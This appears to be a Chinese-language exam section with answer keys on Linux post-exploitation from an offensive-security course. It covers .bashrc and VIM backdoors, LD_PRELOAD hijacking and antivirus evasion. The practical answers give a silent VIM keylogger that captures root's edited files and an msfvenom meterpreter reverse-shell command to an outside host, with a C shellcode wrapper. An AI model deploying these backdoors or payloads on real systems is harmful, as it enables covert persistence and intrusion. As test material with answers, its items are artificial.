## 三、简答题 (每题 10 分，共 40 分)

### 1. 请描述如何利用 .bashrc 实现持久化后门。

**参考答案要点**：
- .bashrc 在每次打开新终端时执行
- 可以添加反向 Shell 命令
- 使用 nohup 和 & 后台执行
- 可以添加延时避免阻塞终端
- 示例命令和隐蔽技巧

### 2. 请解释 VIM 后门的三种实现方式及其优缺点。

**参考答案要点**：
- 方法一：直接修改 .vimrc
  - 优点：简单
  - 缺点：容易被发现
- 方法二：加载外部脚本
  - 优点：稍微隐蔽
  - 缺点：需要额外文件
- 方法三：使用插件目录
  - 优点：最隐蔽
  - 缺点：需要创建目录

### 3. 请描述如何使用 C 语言包装器绕过 Linux 杀软。

**参考答案要点**：
- 使用 msfvenom 生成 C 格式 Shellcode
- 创建 C 包装器程序
- 使用函数指针执行 Shellcode
- 使用 -z execstack 编译
- 可以添加 XOR 加密增强绕过

### 4. 请解释 LD_PRELOAD 技术的原理和应用场景。

**参考答案要点**：
- LD_PRELOAD 允许预加载共享库
- 可以覆盖标准库函数
- 使用 __attribute__((constructor)) 自动执行
- 应用场景：函数劫持、后门植入
- 编译方法：gcc -shared -fPIC

## 四、实践题 (每题 15 分，共 30 分)

### 1. 创建 VIM 键盘记录器

**要求**：
- 只在 root 用户时记录
- 记录所有编辑的文件内容
- 静默执行，不显示任何输出

**参考答案**：
```vim
" ~/.vim/plugin/keylogger.vim
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/.vimlog
:endif
```

### 2. 创建 C 语言 Shellcode 包装器

**要求**：
- 使用 msfvenom 生成 Shellcode
- 创建 C 包装器
- 编译并测试

**参考答案**：
```bash
# 生成 Shellcode
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=192.168.119.120 LPORT=4444 -f c

# 创建 C 文件
cat > payload.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = "\x48\x31\xff..."; // shellcode

int main() {
    int (*ret)() = (int(*)())buf;
    ret();
    return 0;
}
EOF

# 编译
gcc -o payload payload.c -z execstack
```
